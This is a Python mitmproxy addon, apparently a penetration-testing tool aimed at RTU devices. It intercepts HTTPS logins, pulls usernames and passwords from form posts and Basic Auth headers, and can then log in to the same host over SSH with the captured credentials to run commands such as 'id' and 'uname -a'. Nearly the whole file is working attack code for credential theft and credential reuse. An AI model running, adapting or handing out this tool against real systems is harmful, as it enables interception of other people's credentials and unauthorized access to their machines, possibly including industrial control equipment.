import sys, base64
from mitmproxy import http
import paramiko

####################
# Purpose: 
#     This script is used to grab credentials from HTTPS authentications. 
#     These credentials can be used to authenticate to the web application or service.
#     These credentials can also be used to authenticate with other network services
#     such as Telnet and SSH
# # Requirements
#     mitmproxy - machine-in-the-middle proxy that takes python scripts to process data
#     paramiko  - python based ssh client that comes installed on Kali
####################


####################
# Original Example: https://stackoverflow.com/questions/27369144/use-mitmproxy-to-translate-a-form-key-value-to-a-body-post
####################
DEBUG = False
#DEBUG = True
SSH_CONNECT = False
#SSH_CONNECT = True

class GetRTUCreds:
    
    #Process HTTPS Request
    def request(self,flow: http.HTTPFlow):
        u = ''
        p = ''
        h = ''
        # Form-based Authentication
        if flow.request.method == "POST":
            # NOTE: The form variables MUST be modified to match form fields
            #       Use 'mitmdump -w <file>' and 'mitmdump -r <file>' to troubleshoot
            # NOTE: Use the following to print the contents of the request
            if DEBUG: print("%s"%(flow.request.urlencoded_form))
            # NOTE: Use the following to print the help for urlencoded_form methods
            if DEBUG: print("%s"%(help(flow.request.urlencoded_form)))
            form = flow.request.urlencoded_form
            u = form.get('username')
            p = form.get('password')
            h = flow.request.headers['Host']
        # Basic Authentication
        if flow.request.method == "GET":
            h = flow.request.headers['Host']
            atype,creds = flow.request.headers['Authorization'].split()
            if DEBUG: print("Host: %s Type: %s Creds: %s"%(h,atype,creds))
            u,p = self.basic_auth_decode(creds)
            if DEBUG: print("Username %s : Password %s"%(u,p))
        # Attack Via SSH
        if SSH_CONNECT and h and u and p:
            if DEBUG: print("Attacking %s:%s:%s"%(h,u,p))
            self.ssh_connect(server=h,username=u,password=p)

    # Decode Basic Authentication Base64 Encoded Credentials
    def basic_auth_decode(self, data):
        return base64.b64decode(data).decode('ascii').split(':',1)

    # Connect to SSH server using captured credentials
    def ssh_connect(self, server, username, password):
        if DEBUG: print("# Attempting to ssh connect.")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=server, username=username, password=password)
        except:
            print("SSH: Unable to connect to client at %s"%(self.localhost))
            client.close()
            sys.exit()

        # Run commands after connecting via SSH
        if DEBUG: print("# Attempting to run commands.")
        # NOTE: Update commands to run here. Results will be printed to terminal
        cmds = ['hostname','uname -a','id']
        for c in cmds:
            try: 
                stdin, stdout, stderr = client.exec_command(c)
                if stdout: 
                    out = stdout.read().decode().strip()
                    print("Result: %s"%(out))
                #if stdin: sin = stdin.read().decode().strip()
                if stderr: 
                    err = stderr.read().decode().strip()
                    print("Result: %s"%(err))
            except:
                print('Cmd Failed: %s'%(c))
        client.close() 

addons = [GetRTUCreds()]
